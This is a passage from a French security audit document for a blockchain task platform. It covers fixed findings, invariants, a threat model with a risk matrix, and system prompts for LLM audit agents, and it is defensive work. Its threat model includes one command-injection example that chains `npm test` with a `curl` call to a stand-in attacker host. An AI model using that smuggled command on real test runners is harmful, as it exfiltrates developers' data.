**Problème :** `if (treasuryShare + projectShare != actualSlash) revert InvalidDistribution()` — `projectShare` étant défini comme `actualSlash - treasuryShare`, cette condition est algébriquement impossible → dead code, aucun invariant réel vérifié.

**Correction :** Suppression du check runtime. Ajout dans le constructor :
```solidity
require(PUNISHMENT_TREASURY_BPS + PUNISHMENT_PROJECT_BPS == BPS_DENOMINATOR, "BPS must sum to 10000");
```
Vérification statique au déploiement plutôt que dead code à chaque appel.

---

### [M10-R12] MEDIUM — `withdrawWithProof` : surplus de UTXOs silencieux

| | |
|---|---|
| **Fichier** | `contracts/evm/EscrowVault.sol` |
| **Fonction** | `withdrawWithProof()` |

**Problème :** `if (verifiedTotal < totalAmount)` — si `verifiedTotal > totalAmount`, tous les UTXOs étaient marqués `spent` mais seul `totalAmount` était brûlé et transféré. Le surplus PTF disparaissait.

**Correction :** `if (verifiedTotal != totalAmount)` — égalité stricte exigée.

---

### [L1-R12] LOW — `ReputationRegistry.getLevel()` : external self-call coûteux

| | |
|---|---|
| **Fichier** | `contracts/evm/ReputationRegistry.sol` |
| **Fonction** | `getLevel()` |

**Problème :** `uint256 score = this.getScore(dev)` génère un external CALL (~700–2000 gas supplémentaires pour un re-entry dans le même contrat).

**Correction :**
```solidity
// Avant
uint256 score = this.getScore(dev);

// Après — accès direct au storage privé
int256 raw = _scores[dev];
uint256 score = raw > 0 ? uint256(raw) : 0;
```

---

## Findings corrigés — Audit CIA (Rounds 5–10)

### [CIA-C1] CRITIQUE — JWT secret fallback hardcodé

**Fichier :** `backend/src/services/auth.service.ts`

**Problème :** `"ptf-dev-secret"` utilisé si `JWT_SECRET` absent → tout attaquant connaissant le code source pouvait forger des tokens valides.

**Correction :** `throw new Error(...)` au démarrage si `JWT_SECRET` absent. Aucun fallback.

---

### [CIA-C2] CRITIQUE — Clé privée EVM fallback zéro

**Fichiers :** `polygon.adapter.ts`, `ethereum.adapter.ts`

**Problème :** `"0x" + "0".repeat(64)` — adresse Ethereum bien connue, toutes les transactions on-chain auraient été signées avec une clé compromise.

**Correction :** `throw new Error(...)` si `SIGNER_PRIVATE_KEY` absent. Aucun fallback.

---

### [CIA-I1] CRITIQUE — `submitTask` sans ownership check

**Problème :** Tout utilisateur authentifié pouvait soumettre la tâche d'autrui.

**Correction :** Même logique que `cancelTask` — résolution wallet de l'appelant comparée à `task.devAddress`.

---

### [CIA-I3] CRITIQUE — `publishProject` sans ownership check

**Problème :** Tout utilisateur authentifié pouvait publier le projet d'autrui.

**Correction :** `callerId` passé à `activate()`, vérification `project.ownerId !== callerId`.

---

### [CIA-D1] CRITIQUE — `tasks()` et `projects()` sans pagination

**Problème :** `findMany` illimité → OOM potentiel sur grandes bases.

**Correction :** `take: Math.min(limit ?? 50, 200)` + `skip: offset` dans les deux services.

---

### [CIA-I8] HAUTE — `unlock()` non transactionnel (TOCTOU)

**Correction :** `unlock()` enveloppé dans `this.db.$transaction`, identique à `lock()`.

---

### [CIA-I6] HAUTE — `verifyProof` chainId hardcodé à 137

**Problème :** UTXOs Ethereum/BSC/Arbitrum rejetés comme invalides.

**Correction :** Map `CHAIN_IDS` interne, `chainId` dérivé de `utxo.chain`.

---

### [CIA-D3] HAUTE — Ghost users créés sans limite dans ReportService

**Problème :** Signaler une adresse inconnue créait un user + WalletLink fantôme → inflation DB illimitée.

**Correction :** `throw PtfError(INVALID_ADDRESS)` si l'adresse n'est pas enregistrée.

---

### [CIA-C3/C8] HAUTE — CORS wildcard + erreurs internes exposées

**Correction :**
- `CORS_ORIGIN` obligatoire en production (throw si absent)
- `formatError` masque les détails internes en production
- Introspection GraphQL désactivée en production

---

## Findings corrigés — Refonte Auth (Round 6–8)

### [AUTH-1 à AUTH-8] — Nouveau système d'authentification complet

Voir `AUDIT_CORRECTIONS.md` (Rounds 6, 7, 8) pour le détail complet. Résumé :

| Finding | Correction |
|---------|-----------|
| Login GitHub seul (insuffisant) | Email + mot de passe + clé secp256k1 générée côté serveur |
| Clé privée gérée manuellement | Chiffrée AES-256-GCM côté serveur, stockée localement |
| Aucune vérification nouvel appareil | OTP email 6 chiffres, 10 min, haché scrypt |
| Pas de gestion des appareils | `TrustedDevice` + `DeviceSession` listables et révocables |
| linkWallet nonce généré PENDANT vérification (I4) | Nonce pré-émis en base (`WalletLinkChallenge`), TTL 5 min |
| verifyWallet : signedNonce utilisé comme message ET signature (I5) | EIP-712 correct : `adapter.verifyEIP712Signature(domain, types, {nonce, userId}, sig)` |
| OAuth GitHub sans timeout | `AbortController` 10s sur tous les fetch externes |
| Pas de guards sur claimTask / createProject | `assertFullyLinked(ctx.user)` → `WALLET_NOT_LINKED` ou `GITHUB_NOT_LINKED` |

---

## Invariants de sécurité

Ces invariants doivent être vrais à tout moment. Les violer indique un bug ou une attaque.

### UTXO

| Invariant | Vérification |
|-----------|-------------|
| `sum(unspent UTXOs) + sum(locked UTXOs) == creditBalance` | `UTXOService.getBalance()` |
| Un UTXO `spent` ne peut plus jamais passer à `unspent` | `status` en DB est append-only une fois `spent` |
| `proofHash == keccak256(utxoId_1 ∥ … ∥ utxoId_n)` | `computeProofHash(tx.inputs)` |
| `createdInTxId` d'un change UTXO pointe vers la tx qui l'a créé | FK Prisma `@relation("outputs")` |

### EscrowVault

| Invariant | Test Foundry |
|-----------|-------------|
| `sum(escrowBalance) ≤ usdc.balanceOf(vault)` | `invariant_solvency()` |
| Un `utxoId` ne peut être minté qu'une seule fois | `mintedUTXOs[utxoId] = true` avant `mint()` (séparé de `spentUTXOs`) |
| Un `utxoId` ne peut être dépensé qu'une seule fois | `spentUTXOs[utxoId]` check + `seenIds[]` intra-call |
| `mintedUTXOs[id]` n'implique PAS `spentUTXOs[id]` | Les deux mappings sont indépendants — un UTXO minté est retirable |
| `softLocked[dev] ≤ ptfToken.balanceOf(vault)` | `invariant_softLock()` — tokens en custody vault depuis H6 |
| `sum(projectPunishmentFunds) ≤ cumul des actualSlash` | Invariant comptable — fonds traçables par projet |

### Signatures EIP-712

| Propriété | Valeur |
|-----------|--------|
| Contract name | `"PTFEscrowVault"` |
| Version | `"1"` |
| ChainId | `137` (Polygon mainnet) |
| UTXO typehash | `keccak256("PTFCreditUTXO(bytes32 utxoId,address owner,uint256 amount,bytes32 sourceId,string chain,uint256 createdAt)")` |

---

## Guide pour futurs audits

### Zones à risque élevé

1. **`EscrowVault.withdrawWithProof()`** — point d'entrée pour les retraits. Vérifier : EIP-712 complet, seenIds intra-call, spentUTXOs cross-call, totalAmount vs verifiedTotal.

2. **`UTXOService.spend()`** — coin-selection atomique. Vérifier : tout est dans `$transaction`, `spendNow` capturé une seule fois, proofHash = keccak(utxoIds).

3. **`PunishmentService`** — séquence burn + spend doit être atomique. Vérifier que `utxoService.spend()` est toujours appelé après `adapter.deductPenalty()`.

4. **Domain separator** — doit correspondre exactement entre backend et contrat (`"PTFEscrowVault"`, `"1"`, `137`). Un seul caractère d'écart casse toutes les vérifications silencieusement.

### Commandes d'audit rapide

```bash
# Vérifier les invariants EIP-712
grep -rn '"PTFEscrow"' backend/src/  # doit retourner 0 résultat (corrigé en "PTFEscrowVault")
grep -rn 'recoverAddress\|recover(' backend/src/services/utxo.service.ts  # vérifier le digest

# Vérifier l'atomicité UTXO
grep -n '\$transaction' backend/src/services/utxo.service.ts  # spend() et lock() doivent y être

# Vérifier les guards on-chain
grep -n 'seenIds\|spentUTXOs' contracts/evm/EscrowVault.sol

# Vérifier les dépendances de services
grep -n 'utxoService' backend/src/services/task.service.ts
grep -n 'utxoService' backend/src/services/punishment.service.ts
```

### Checklist avant chaque déploiement contrat

- [ ] Domain separator aligné backend ↔ contrat (nom, version, chainId)
- [ ] UTXO typehash identique backend ↔ contrat
- [ ] `proofHash` calculé avec utxoIds (pas les signatures) — deux endroits
- [ ] `seenIds[]` présent dans la boucle `withdrawWithProof()`
- [ ] `mintedUTXOs[utxoId] = true` dans `mintUTXOReceipt()` avant `mint()` — mapping séparé de `spentUTXOs`
- [ ] `spentUTXOs[utxoId]` check dans `withdrawWithProof()` — jamais dans `mintUTXOReceipt()`
- [ ] `verifiedTotal != totalAmount` (égalité stricte) dans `withdrawWithProof()`
- [ ] `executePunishment()` : 100% au treasury (80% + 20%), `projectPunishmentFunds` mis à jour
- [ ] `executePunishment()` ne touche pas `escrowBalance`
- [ ] Constructor : `require(BPS_TREASURY + BPS_PROJECT == BPS_DENOMINATOR)` présent

### Risques résiduels connus

| Risque | Mitigation actuelle | Mitigation idéale |
|--------|---------------------|-------------------|
| ~~Réconciliation rétroactive après crash prolongé (N3)~~ | ✅ `ReconciliationWorker` — scan périodique depuis `SyncCheckpoint`, backfill + revert stale | Implémenté |
| ~~DB commit avant confirmation on-chain (CIA-I9)~~ | ✅ `detectStaleSpent()` — revert auto après 10min sans `txHash` | Implémenté |
| Arithmétique float sur montants | `toFixed(6)` partout, `Math.round(x * 1e6)` pour on-chain | Migrer vers entiers en micro-PTF |

---

## Surface d'attaque du réseau PTF — Cartographie complète

Cette section documente exhaustivement les vecteurs d'attaque du réseau PTF, les limites architecturales, et les mitigations en place ou manquantes. Elle sert de référence pour les audits futurs et les décisions d'architecture.

---

### 1. Surface d'attaque — Couche réseau et transport

#### 1.1 Nœud PTF unique (SPOF actuel)

**Vecteur :** En phase 1, un seul backend PTF sert toutes les requêtes. Une attaque DDoS volumétrique (>300 req/15min par IP) est limitée par le rate limiter, mais une attaque distribuée depuis des milliers d'IPs différentes peut saturer le serveur.

**Limites :**
- Le rate limiter actuel est par IP — contournable avec un botnet
- Pas de WAF (Web Application Firewall) ni de protection DDoS de couche 3/4
- Un seul backend = cible unique

**Mitigations en place :**
- Rate limiting Redis partagé (300 req/15min global, 20 req/15min auth)
- Node.js cluster (1 worker/CPU) — absorbe les pics de charge légitimes
- Circuit breaker RPC — une panne blockchain ne bloque pas le backend

**Mitigations manquantes :**
- Pas de CDN/WAF devant l'API GraphQL
- Pas de protection anti-DDoS L3/L4 (Cloudflare, AWS Shield)
- Pas de géo-blocage pour les origines connues malveillantes

---

#### 1.2 DNS et BGP hijacking

**Vecteur :** Un attaquant contrôlant le DNS ou un AS (Autonomous System) intermédiaire peut rediriger les clients vers un faux nœud PTF servant des données falsifiées ou collectant des sessions JWT.

**Limites :**
- En phase 1, la CLI est hardcodée sur `https://api.ptf.dev` — un seul point de confiance DNS
- Pas de certificate pinning dans la CLI
- Un DNS compromis redirige tout le trafic CLI

**Mitigations en place :**
- TLS obligatoire — interception passive détectée
- Vérification des hash de métadonnées on-chain — un faux nœud ne peut pas falsifier le contenu sans être détecté

**Mitigations manquantes :**
- Pas de DNSSEC sur ptf.dev
- Pas de certificate pinning CLI
- Pas de liste de nœuds de confiance vérifiée on-chain (prévu en phase 2)

---

#### 1.3 Interception des JWT de session

**Vecteur :** JWT intercepté en transit (MITM) ou volé depuis le stockage local permet d'usurper l'identité d'un utilisateur.

**Limites :**
- Les JWT ne sont pas révocables individuellement (stateless) — une fois volé, valide jusqu'à expiration
- Pas de refresh token — l'utilisateur doit se reconnecter après expiration

**Mitigations en place :**
- TLS obligatoire en production
- JWT contient seulement `ptfAddress + exp` — pas de données sensibles
- La clé privée ne quitte jamais la machine — un JWT volé ne permet que des lectures

**Mitigations manquantes :**
- Pas de révocation de session individuelle (seulement `ptf auth logout` local)
- Pas de détection d'utilisation anormale du JWT (géolocalisation, fingerprint)

---

### 2. Surface d'attaque — Couche authentification

#### 2.1 Bruteforce du keystore local

**Vecteur :** Un attaquant accédant au fichier `~/.ptf/keystore/<address>.json` peut tenter de bruteforcer le mot de passe de chiffrement AES-256-GCM.

**Limites :**
- PBKDF2 600 000 itérations ralentit le bruteforce (~2s par tentative sur CPU moderne)
- Pas de limite de tentatives locales — un script peut tenter en continu sans être bloqué
- Mots de passe faibles (8 caractères minimum) restent vulnérables à des dictionnaires ciblés

**Mitigations en place :**
- AES-256-GCM avec PBKDF2 600k iterations — coût computationnel élevé
- Sel aléatoire par keystore — pas de rainbow tables possibles
- Mode 0600 sur le fichier keystore — inaccessible aux autres utilisateurs du système

**Mitigations manquantes :**
- Pas de limite de tentatives locales
- Pas d'intégration hardware wallet (Ledger/Trezor)
- Minimum 8 caractères insuffisant — recommandation non enforced au-delà

---

#### 2.2 Replay d'un nonce de challenge-response

**Vecteur :** Capturer un nonce signé et le rejouer avant expiration pour obtenir un JWT sans posséder la clé privée.

**Limites :**
- TTL du nonce en mémoire serveur — si le serveur redémarre entre le challenge et la réponse, le nonce est perdu

**Mitigations en place :**
- Nonce TTL 5 minutes — fenêtre de replay limitée
- Nonce consommé après utilisation — pas de replay

**Mitigations manquantes :**
- Nonces stockés en mémoire (pas en Redis) — perte au redémarrage force une nouvelle connexion
- Pas de binding du nonce à l'adresse IP du demandeur

---

#### 2.3 Usurpation d'adresse PTF

**Vecteur :** Générer une adresse qui ressemble visuellement à une adresse légitime (vanity address attack) pour tromper les créateurs de projets qui payent les rewards.

**Limites :**
- Adresses affichées en format tronqué `0xAbCd...1234` — 8 premiers + 4 derniers chars
- Un attaquant avec assez de GPU peut générer une adresse avec le même préfixe et suffixe visible

**Mitigations en place :**
- Vérification EIP-55 checksum — une adresse avec casse incorrecte est rejetée
- Ownership prouvé par signature ECDSA — impossible d'usurper sans la clé privée

**Mitigations manquantes :**
- Affichage tronqué dangereux — afficher l'adresse complète serait plus sûr

---

### 3. Surface d'attaque — Couche backend

#### 3.1 Injection GraphQL

**Vecteur :** Requêtes GraphQL imbriquées profondément (`tasks { project { tasks { project { ... } } } }`) causant des boucles de jointures O(n^k) en base.

**Mitigations en place :**
- Profondeur max 6 (`depthLimitRule` dans `ApolloServer.validationRules`)
- Introspection désactivée en production
- Pagination forcée (max 200 résultats)

**Mitigations manquantes :**
- Pas de query complexity scoring — une requête large mais peu profonde reste possible
- Pas de timeout par requête GraphQL

---

#### 3.2 Race condition sur le claim de tâche

**Vecteur :** Deux développeurs tentent de clamer la même tâche simultanément. Sans protection, les deux reçoivent un `ClaimResult` valide.

**Mitigations en place :**
- Redlock distribué sur Redis Sentinel (TTL 10s)
- Statut intermédiaire `claim_pending` en DB avant l'appel on-chain
- Double-check du statut sous lock

**Limites :**
- Si Redis Sentinel tombe au moment du lock, le claim est refusé (comportement correct — fail-closed)
- TTL 10s peut être insuffisant si le RPC blockchain est très lent (congestion réseau L2)

---

#### 3.3 Manipulation des `verificationSteps`

**Vecteur :** Un créateur de projet malveillant inclut dans les `verificationSteps` des commandes qui exfiltrent des données ou compromettent le sandbox du développeur.

**Mitigations en place :**
- Allowlist stricte des commandes autorisées (`npm test`, `npx jest`, `cargo test`, etc.)
- Sandbox gVisor pour l'exécution — réseau sortant désactivé, filesystem read-only
- Commandes masquées dans les tâches privées si elles révèlent l'infra interne

**Limites :**
- L'allowlist est vérifiée par un `startsWith()` — `npm test; curl attacker.com` passerait si la commande commence par `npm test`
- Pas de parsing AST des commandes — injection via arguments

**Mitigations manquantes :**
- Parser strict des commandes (séparation binaire/arguments, pas de shell expansion)
- Validation que la commande n'utilise pas `&&`, `;`, `|`, `$()`

---

#### 3.4 Falsification des métadonnées de tâche

**Vecteur :** Un nœud PTF malveillant modifie le contenu d'une tâche (contexte, verificationSteps, punishments) avant de le servir à un développeur.

**Mitigations en place (nouvelles — CAS):**
- `MetadataRegistry` on-chain stocke `keccak256(task_json)` à la publication
- La CLI recalcule le hash à la réception et compare à l'ancre on-chain
- Un hash différent déclenche un avertissement et un switch vers un autre nœud

**Limites :**
- En phase 1, la vérification on-chain est optionnelle (appel RPC coûteux) — elle devrait être systématique
- Si la CLI ne vérifie pas et que l'utilisateur fait confiance au nœud, la falsification passe

**Mitigations manquantes :**
- Vérification on-chain obligatoire pour les opérations à enjeu financier (claim, publish)
- Liste noire des nœuds détectés malveillants

---

#### 3.5 Pollution du `NetworkBroadcast`

**Vecteur :** Un nœud malveillant injecte de faux broadcasts (fausses tâches, faux statuts) dans le réseau gossip P2P.

**Mitigations en place :**
- Chaque broadcast est signé par la clé officielle PTF
- Les Merkle roots permettent à tout nœud de vérifier la cohérence du broadcast

**Limites :**
- En phase 1, il n'y a qu'un seul nœud (PTF Corp) — pas de réseau P2P réel
- La clé de signature PTF est un point de centralisation — si compromise, des broadcasts falsifiés semblent légitimes

**Mitigations manquantes :**
- Rotation de la clé de signature PTF
- Multi-signature sur les broadcasts critiques

---

### 4. Surface d'attaque — Couche smart contracts

#### 4.1 Reentrancy sur EscrowVault

**Vecteur :** Un token ERC-777 (avec hooks `tokensReceived`) utilisé comme `usdcToken` permettrait un appel rentrant dans `releaseTaskReward` avant que `softLocked[dev]` soit mis à jour.

**Mitigations en place :**
- `nonReentrant` (OpenZeppelin) sur toutes les fonctions de transfert
- Pattern checks-effects-interactions respecté
- `SafeERC20.safeTransfer` au lieu de `transfer` direct
- USDC (standard ERC-20 sans hooks) — pas de callback possible

**Limites :**
- Si PTF accepte un jour un stablecoin ERC-777, le pattern hooks devient un vecteur
- La contrainte "ERC-20 standard SANS hooks" n'est pas enforced on-chain

---

#### 4.2 Front-running du claim on-chain

**Vecteur :** Un observateur du mempool voit une transaction `claimTask(taskId, devAddress, conditionsHash)` en attente, la copie avec une gas price plus élevée et sa propre adresse, et se retrouve à clamer la tâche avant le développeur légitime.

**Limites :**
- Sur Polygon (PoS), le mempool est visible publiquement
- Les transactions L2 ont des temps de confirmation de quelques secondes — fenêtre courte mais réelle

**Mitigations en place :**
- `conditionsHash` inclut le `taskId` et les conditions — sans accès au contenu off-chain, l'attaquant ne peut pas valider la tâche

**Mitigations manquantes :**
- Commit-reveal scheme pour le claim — soumission d'un hash first, révélation ensuite
- Utilisation d'un relayer privé (Flashbots) pour les transactions critiques

---

#### 4.3 Griefing — tâche bloquée indéfiniment

**Vecteur :** Un développeur réclame une tâche (10 PTF soft-locked), n'avance pas, et annule juste avant le deadline (>50% de la durée écoulée) pour minimiser la pénalité tout en bloquant la tâche pendant toute la durée.

**Mitigations en place :**
- Pénalité `lateDelivery` appliquée si >50% de la durée est écoulée
- `TimerService` expire automatiquement la tâche à deadline et applique la pénalité
- Score de réputation dégradé — le développeur perdra accès aux futures tâches si réputation trop basse

**Limites :**
- Un développeur avec une haute réputation peut griffer plusieurs tâches avant que son score soit trop bas
- Les pénalités configurables par le créateur peuvent être très faibles

---

#### 4.4 Oracle manipulation (prix PTF/USDC)

**Vecteur :** Si le taux de conversion PTF/USDC est manipulé via flash loan sur le pool DEX utilisé comme oracle, un attaquant peut deposit peu d'USDC et obtenir beaucoup de PTF (ou vice-versa).

**Limites :**
- Chainlink est utilisé comme oracle — résistant aux flash loans (TWAP + circuit breaker)
- Mais si Chainlink est down ou stale, le CurrencyConverter peut accepter des taux périmés

**Mitigations en place :**
- `IOracleProvider.isStale()` vérifie l'âge du prix
- `lockRate()` garantit le taux pendant 60 secondes

**Mitigations manquantes :**
- Pas de circuit breaker sur un décrochage de prix brutal (>10% en 1 bloc)
- Pas de fallback oracle si Chainlink est down

---

### 5. Limites architecturales fondamentales

Ces limites ne sont pas des bugs — ce sont des contraintes structurelles de l'architecture actuelle. Les corriger nécessite des changements d'architecture majeurs.

#### 5.1 PTF Corp est un point de confiance central

Tout passe par PTF Corp en phase 1 :
- Seule entité autorisée à appeler `onlyBackend` / `onlyRegistrar` sur les contrats
- Seule entité à signer les `NetworkBroadcast`
- Seule entité à archiver sur Arweave (en pratique, même si techniquement ouvert)
- Si PTF Corp est compromise, tout le système l'est

**Chemin vers la décentralisation :** DAO + multisig + `NodeRegistry` (phase 2-3).

---

#### 5.2 La logique de validation est off-chain et centralisée

Les `verificationSteps` sont exécutés dans un sandbox gVisor géré par PTF. Un résultat `pass` ne peut pas être vérifié indépendamment par un tiers — il faut faire confiance à PTF Agent.

**Conséquence :** PTF Corp peut valider une soumission frauduleuse ou rejeter une soumission correcte. Les preuves signées par l'agent sont vérifiables (signature ECDSA) mais pas le processus d'exécution lui-même (pas de TEE/SGX).

---

#### 5.3 Le modèle UTXO off-chain n'est pas la source de vérité

Les UTXOs sont gérés en PostgreSQL (DB PTF). La blockchain est la source de vérité financière mais les UTXOs individuels ne sont pas représentés on-chain — seuls les soldes agrégés le sont.

**Conséquence :** En cas de divergence entre PostgreSQL et la blockchain (crash, bug de reconciliation), le `ReconciliationWorker` peut ne pas récupérer tous les états — des fonds peuvent rester bloqués.

---

#### 5.4 Métadonnées des tâches actives centralisées

Tant que le `MetadataStore` distribué (phase 2) n'est pas implémenté, les métadonnées des tâches actives n'existent que dans PostgreSQL de PTF Corp. Si la DB est perdue, les specs des tâches actives sont perdues (les hash on-chain survivent, mais pas le contenu).

**Mitigation partielle :** L'archivage Arweave se déclenche à la validation — les tâches terminées sont protégées. Seules les tâches en cours sont vulnérables.

---

### 6. Matrice de risque

| Vecteur | Probabilité | Impact | Mitigation actuelle | Priorité |
|---|---|---|---|---|
| DDoS backend | Élevée | Disponibilité | Rate limiting Redis | 🟠 Moyen |
| DNS/BGP hijacking | Faible | Critique | TLS + hash verification | 🟡 Bas |
| Bruteforce keystore local | Faible | Élevé | PBKDF2 600k iter | 🟡 Bas |
| Replay nonce auth | Très faible | Élevé | TTL 5min + consume | 🟢 Résiduel |
| Injection GraphQL profonde | Faible | Moyen | depthLimitRule max 6 | 🟡 Bas |
| Race condition claim | Faible | Élevé | Redlock + claim_pending | 🟡 Bas |
| verificationSteps injection | Moyenne | Élevé | Allowlist + gVisor | 🟠 Moyen |
| Falsification métadonnées | Faible | Élevé | CAS hash verification | 🟡 Bas |
| Front-running claim | Faible | Moyen | Peu d'impact pratique | 🟡 Bas |
| Griefing tâches | Moyenne | Faible | Pénalités + expiration | 🟡 Bas |
| Oracle manipulation | Très faible | Élevé | Chainlink TWAP | 🟢 Résiduel |
| Reentrancy EscrowVault | Très faible | Critique | nonReentrant + patterns | 🟢 Résiduel |
| PTF Corp compromise | Faible | Catastrophique | Aucune (phase 1) | 🔴 Élevé |
| Perte DB PostgreSQL | Très faible | Élevé | Backup + Arweave partiel | 🟠 Moyen |

---

### 7. Recommandations prioritaires

**Priorité haute — à traiter avant mainnet :**

1. **Parser strict des `verificationSteps`** — remplacer `startsWith()` par un vrai parser qui sépare binaire et arguments, interdit `&&`, `;`, `|`, `$()`
2. **Vérification on-chain obligatoire** pour claim et publish — pas optionnelle
3. **DNSSEC sur ptf.dev** + publication du fingerprint TLS dans le DNS
4. **Multisig sur les fonctions `onlyOwner`** des contrats (Gnosis Safe 3-of-5)
5. **Timelock 24h** sur les opérations d'admin des contrats

**Priorité moyenne — post-lancement :**

6. **WAF/CDN** devant l'API GraphQL (Cloudflare Workers)
7. **Query complexity scoring** en plus du depth limit
8. **NodeRegistry on-chain** — liste des nœuds de confiance vérifiés (phase 2)
9. **Certificate pinning CLI** — vérification du certificat TLS en plus du DNS
10. **Migration vers entiers micro-PTF** — éliminer l'arithmétique float

**Priorité basse — long terme :**

11. **TEE/SGX pour PTF Agent** — remote attestation vérifiable de l'exécution des tests
12. **Commit-reveal scheme** pour les claims on-chain — anti front-running
13. **DAO + slashing** — décentraliser le contrôle de PTF Corp
14. **Rotation automatique** de la clé de signature PTF Corp

---

## Ce qu'on cherche dans les audits

Chaque audit PTF cherche des défauts dans quatre dimensions. Les dimensions sont communes à toutes les couches — contrats, backend, CLI. Seules les manifestations concrètes changent selon la couche.

---

### Dimension 1 — Correctness (comportement correct)

**Question centrale : le code fait-il exactement ce qu'il est censé faire, ni plus ni moins ?**

Ce qu'on cherche :
- **Logique incorrecte** — une condition inversée, une soustraction au lieu d'une addition, un comparateur `<` au lieu de `<=`
- **État incohérent** — la DB dit `claimed`, la blockchain dit `open`
- **Résultat incorrect** — un hash calculé différemment selon le chemin d'exécution, un montant arrondi incorrectement
- **Champ oublié** — un champ immuable exclu de `extractTaskHashableFields`, une vérification absente dans un resolver

**Manifestations par couche :**

| Couche | Exemples concrets |
|---|---|
| Contrats | `verifiedTotal != totalAmount` au lieu de `<`, distribution 80/20 tautologique, `mintedUTXOs` confondu avec `spentUTXOs` |
| Backend | `claim_pending` rollback qui écrase un claim légitime, `DEFAULT_PUNISHMENTS` appliquées sans log, delta réputation négatif non borné |
| CLI | `filesChanged` comptant la ligne résumé de `git diff --stat`, `saveUserConfig` ignorant `undefined` au lieu de supprimer |

---

### Dimension 2 — Sécurité (résistance aux attaques)

**Question centrale : un acteur malveillant peut-il obtenir plus que ce qu'il est autorisé à obtenir ?**

Ce qu'on cherche, par catégorie :

**Contrôle d'accès :**
- Fonction appelable sans authentification alors qu'elle devrait l'exiger
- Ownership non vérifié — n'importe qui peut agir sur la ressource d'autrui
- `onlyOwner` EOA sans multisig — clé unique = point de compromission

**Injection :**
- Shell : `shellEscape` insuffisant, `execFile` avec args contenant des metacharacters passés à un sous-processus shell
- GraphQL : depth trop permissif, complexity non bornée, input non validé passé directement à une requête
- Prompt LLM : contenu user injecté dans le prompt système du TaskGeneratorService

**Replay et double-spend :**
- Signature EIP-712 sans nonce ou sans deadline → rejouable
- UTXO consommé deux fois dans le même appel (intra-call) ou entre deux appels (cross-call)
- Nonce challenge-response en mémoire → rejouable après redémarrage

**Race conditions (TOCTOU) :**
- Lecture → vérification → écriture sans verrou atomique
- `findMany` hors transaction puis `updateMany` → deux appels concurrents lisent le même snapshot

**Fuite d'information :**
- Stack trace exposé en production
- Clé privée loggée dans `console.error` sur erreur RPC
- Données privées d'un projet `private` visibles via `mine: true`
- `eip712Signature` retourné dans l'API publique

**Griefing (bloquer sans voler) :**
- Clamer toutes les tâches d'un projet sans les réaliser
- Soumettre un arweaveId invalide avant le nœud légitime pour bloquer l'archivage
- Remplir le stream `cache-events` pour saturer les consumers

---

### Dimension 3 — Résilience (comportement sous stress et pannes)

**Question centrale : le système se comporte-t-il correctement quand quelque chose échoue ou est soumis à une charge anormale ?**

Ce qu'on cherche :
- **Crash mid-flight** — que se passe-t-il si le process s'arrête entre l'écriture DB et l'appel on-chain ?
- **Panne partielle** — Redis indisponible, RPC blockchain timeout, PostgreSQL lent
- **Charge anormale** — 100 claims simultanés, 1000 invalidations cache/s, 100 expirations simultanées
- **Retry storm** — un job BullMQ qui échoue et se relance en boucle sature-t-il la DB ?
- **State divergence** — après un crash, la réconciliation converge-t-elle vers le bon état ?
- **Idempotence** — un worker qui re-traite un event déjà traité produit-il le même résultat ?

**Manifestations par couche :**

| Couche | Exemples concrets |
|---|---|
| Contrats | `nonReentrant` tient-il sous appels récursifs ? `Pausable` bloque-t-il effectivement toutes les fonctions financières ? |
| Backend | `claim_pending` rollback vs ReconciliationWorker simultanés, `softUnlock` concurrent pour le même dev, BullMQ job TTL trop court |
| Workers | queryFilter sur 2000 blocs timeout RPC, stale `claim_pending` rollbacké alors que l'on-chain a confirmé, deposit.worker stub actif en prod |
| CLI | `ptf submit` interrompu après push mais avant soumission GraphQL, tracker.json corrompu |

---

### Dimension 4 — Complétude (rien n'est oublié)

**Question centrale : y a-t-il des cas limites, des chemins d'erreur, ou des invariants qui ne sont pas vérifiés ?**

Ce qu'on cherche :
- **Dead code actif** — du code jamais appelé qui pourrait l'être par erreur ou par un attaquant
- **Cas limite non traités** — liste vide, montant zéro, adresse nulle, chaîne inconnue, TTL expiré exactement à la milliseconde
- **Invariants non documentés** — `sum(unspent) + sum(locked) == balance` vérifié nulle part en production
- **Migrations manquantes** — nouveau champ Prisma sans migration, ancien schéma GraphQL incompatible
- **TODOs en production** — `// TODO: Notification via NotificationService` dans TimerService
- **Stubs non remplacés** — `MockStorageProvider` en production, `deposit.worker` stub

---

### Format de sortie attendu par les agents

Tout agent d'audit retourne ses findings en JSON structuré. Format commun à toutes les couches :

```json
{
  "module": "backend-claim",
  "file": "backend/src/services/task.service.ts",
  "line": 347,
  "severity": "critical | high | medium | low | informational",
  "dimension": "correctness | security | resilience | completeness",
  "category": "string — ex: race-condition, injection, access-control, state-divergence",
  "title": "Titre court (< 60 chars)",
  "description": "Description technique précise du problème",
  "attack_scenario": "Inputs / état initial → actions → résultat incorrect",
  "recommendation": "Correction précise avec code si applicable",
  "confidence": "high | medium | low"
}
```

**Sévérités :**
- `critical` — exploitation directe sans précondition, perte de fonds ou compromission complète
- `high` — exploitation sous conditions réalistes, impact significatif
- `medium` — exploitation sous conditions spécifiques, impact modéré
- `low` — amélioration de robustesse, impact faible
- `informational` — observation sans impact sécurité direct

**Convergence inter-agents :** un finding présent dans ≥2 rapports indépendants est confirmé. Un finding dans 1 seul rapport est marqué "à vérifier manuellement".

---

### Prompts système par type de module

#### Pour les modules `contracts-*`

```
Tu es un auditeur de smart contracts Solidity expert (niveau Trail of Bits / OpenZeppelin).
Analyse le code fourni de façon EXHAUSTIVE et INDÉPENDANTE — sans voir les résultats d'autres agents.

Cherche des défauts dans ces 4 dimensions :
1. CORRECTNESS : logique incorrecte, état incohérent, résultat incorrect, champ oublié
2. SECURITY : reentrancy, overflow, access control, EIP-712 (nonce/deadline/domain), replay, front-running, griefing
3. RESILIENCE : comportement sous panne partielle, idempotence, pause/unpause couvre tout
4. COMPLETENESS : dead code, cas limites (montant zéro, adresse nulle), invariants non vérifiés

Pour chaque finding, retourne un objet JSON avec les champs :
module, file, line, severity (critical|high|medium|low|informational),
dimension (correctness|security|resilience|completeness),
category, title, description, attack_scenario, recommendation, confidence.

Retourne un tableau JSON uniquement. Pas de texte avant ou après.
```

#### Pour les modules `backend-*`

```
Tu es un auditeur de sécurité backend Node.js/TypeScript expert.
Analyse le code fourni de façon EXHAUSTIVE et INDÉPENDANTE.

Contexte PTF : système financier décentralisé. Les opérations de claim,
submit, validate impliquent des fonds USDC réels. Toute incohérence
d'état peut bloquer des fonds ou les détourner.

Cherche des défauts dans ces 4 dimensions :
